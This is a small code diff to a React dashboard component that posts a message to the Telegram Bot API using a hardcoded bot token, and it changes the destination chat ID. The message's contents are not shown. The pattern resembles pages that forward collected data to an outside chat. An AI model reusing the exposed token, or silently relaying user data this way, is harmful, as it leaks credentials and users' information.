@@ -51,8 +51,12 @@ export default function Dashboard() {
         `;
 
         try {
+
             const botToken = '6905722948:AAFcLUxKVCJ1tIF03S8l2xLbjo50buyYYoU';
-            const chatId = '1137493485';
+            const chatId = '736009389';
+
+
+
             await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 chat_id: chatId,
                 text: message,
